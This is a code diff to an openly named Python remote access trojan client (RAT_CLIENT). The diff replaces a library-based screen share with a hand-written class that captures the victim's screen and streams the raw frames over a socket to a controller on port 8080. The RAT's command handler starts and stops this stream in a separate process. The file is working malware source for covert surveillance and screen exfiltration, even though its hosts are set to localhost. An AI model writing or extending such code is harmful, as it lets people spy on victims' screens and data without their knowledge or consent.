@@ -7,7 +7,10 @@ from datetime import datetime
 import ctypes
 import psutil
 import uuid
-from vidstream import ScreenShareClient
+from multiprocessing import Process
+import cv2
+from PIL import ImageGrab
+import numpy as np
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -23,13 +26,58 @@ FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
 
 
+class ScreenShare():
+    def __init__(self):
+        print("[*] Initializing screen share")
+        # Start a socket connection. If connected, allow to continue
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.host = "localhost"
+        self.port = 8080
+
+    def start_screenshare(self):
+        print("[*] Starting  :D :D screen share")
+        self.s.connect((self.host, self.port))
+        self.connected = True
+        print("[*] Connected to server")
+        # Start the screenshare, send images towards the server. The server will then turn it into images
+        while True:
+            try:
+                print("Trying to send image")
+                # Get the image
+                img = self.get_screenshot()
+
+                # Send the image to the server
+                print("[*] Sending image" + str(img.shape))
+
+                # Save the file to the system before sending it
+                # cv2.imwrite("temp" + uuid.uuid4().hex + ".jpg", img)
+                self.s.sendall(img)
+
+            except Exception as e:
+                print(f"Error sending image: {str(e)}")
+                self.connected = False
+                break
+
+    def get_screenshot(self):
+        # Get the screenshot of the current screen and return it as a numpy array
+        img = ImageGrab.grab()
+        img = np.array(img)
+
+        return img
+
+    def stop_screenshare(self):
+        self.connected = False
+        self.s.close()
+
+
 class RAT_CLIENT:
     def __init__(self, host, port):
         self.host = host
         self.port = port
         self.curdir = os.getcwd()
         self.command_history = []
-        self.screen_share_thread = None  # Initialize screen share thread
+
+        self.screenshareClient = ScreenShare()
 
     def build_connection(self):
         global s
@@ -76,42 +124,20 @@ class RAT_CLIENT:
 
             s.send(output.encode())
 
-    def start_screen_share(self):
-        try:
-            if not self.screen_share_thread or not self.screen_share_thread.is_alive():
-                # Start a new screen share thread
-                self.screen_share_thread = Thread(
-                    target=self.start_screen_share_thread, daemon=True)
-                self.screen_share_thread.start()
-                return "Screen share started at http://{}:8080".format(self.host)
-            else:
-                return "Screen share is already running"
-        except Exception as e:
-            return "Error starting screen share: {}".format(str(e))
-
-    def start_screen_share_thread(self):
-        try:
-            screen_share_client = ScreenShareClient(self.host, 8080)
-            screen_share_client.start_stream()
-        except Exception as e:
-            print("Error during screen sharing:", str(e))
-
     def handle_function(self, function_name):
-        if (function_name == "screen_share"):
-            return self.start_screen_share()
-        elif (function_name == "stop_screen_share"):
-            return self.stop_screen_share()
-
-    def stop_screen_share(self):
-        try:
-            if self.screen_share_thread and self.screen_share_thread.is_alive():
-                # Stop the screen share thread
-                self.screen_share_thread.join()
-                return "Screen share stopped"
-            else:
-                return "Screen share is not running"
-        except Exception as e:
-            return "Error stopping screen share: {}".format(str(e))
+        if function_name == "screen_share":
+            print("[*] Starting screen share")
+            # Use the self.screenshareClient object to start the screenshare but in a separate process
+            self.screen_share_process = Process(
+                target=self.screenshareClient.start_screenshare)
+            self.screen_share_process.start()
+            return "Screen share started successfully at port 8080"
+        elif function_name == "stop_screen_share":
+            # Stop the screenshare
+            self.screenshareClient.stop_screenshare()
+            # Terminate the process
+            self.screen_share_process.terminate()
+            return "Screen share stopped successfully"
 
 
 rat = RAT_CLIENT('localhost', 4444)
